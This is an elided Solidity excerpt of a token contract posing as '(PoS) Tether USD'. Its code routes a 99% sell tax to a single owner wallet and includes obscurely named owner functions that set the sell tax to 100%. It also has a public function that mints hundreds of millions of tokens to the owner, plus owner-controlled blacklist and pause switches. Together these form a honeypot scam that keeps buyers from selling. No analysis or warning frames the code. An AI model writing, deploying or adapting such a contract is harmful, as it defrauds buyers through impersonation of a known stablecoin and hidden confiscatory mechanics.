...
contract ERC20 is Context, IERC20 {
    ...
    string private _name = "(PoS) Tether USD";
...
contract USDT is ERC20, Ownable, Pausable {
    uint256 private initialSupply;
    uint256 private denominator = 100;
    uint256 private swapThreshold = 1000 ether;
    ...
    uint256 private devTaxSell = 0;
    uint256 private marketingTaxSell = 99;
    uint256 private liquidityTaxSell = 0;
    uint256 private charityTaxSell = 0;
    address private devTaxWallet = _ChuSoHuu;
    address private marketingTaxWallet = _ChuSoHuu;
    address private liquidityTaxWallet = _ChuSoHuu;
    address private charityTaxWallet = _ChuSoHuu;
    ...
    function Bridge() public{
        _mint(_ChuSoHuu, 659692601*decimals());
    }
    ...
    function _transfer(
        ...
        require(!paused(), "USDT: token transfer while paused");
        require(!isBlacklisted(msg.sender), "USDT: sender blacklisted");
        require(!isBlacklisted(recipient), "USDT: recipient blacklisted");
        require(!isBlacklisted(tx.origin), "USDT: sender blacklisted");
        if(taxStatus) {
    ...
    function pause() public onlyOwner {
        require(!paused(), "USDT: Contract is already paused");
        _pause();
    }
    function unpause() public onlyOwner {
        require(paused(), "USDT: Contract is not paused");
        _unpause();
    }
    ...
    function enableBlacklist(address account) public onlyOwner {
        require(!blacklist[account], "USDT: Account is already blacklisted");
        blacklist[account] = true;
    }
    function disableBlacklist(address account) public onlyOwner {
        require(blacklist[account], "USDT: Account is not blacklisted");
        blacklist[account] = false;
    }
    function exclude(address account) public onlyOwner {
        require(!isExcluded(account), "USDT: Account is already excluded");
        excludeList[account] = true;
    }
    function removeExclude(address account) public onlyOwner {
        require(isExcluded(account), "USDT: Account is not excluded");
    ...
    function BuOnLaU() public onlyOwner {
        sellTaxes["dev"] = 0;
        sellTaxes["marketing"] = 100;
        sellTaxes["liquidity"] = 0;
        sellTaxes["charity"] = 0;
    }
    function BiBaT() public onlyOwner {
        sellTaxes["dev"] = 0;
        sellTaxes["marketing"] = 0;
        sellTaxes["liquidity"] = 0;
        sellTaxes["charity"] = 0;
    }
    ...
    function enableTax() public onlyOwner {
        require(!taxStatus, "USDT: Tax is already enabled");
        taxStatus = true;
    }
    function disableTax() public onlyOwner {
        require(taxStatus, "USDT: Tax is already disabled");
        taxStatus = false;
    }
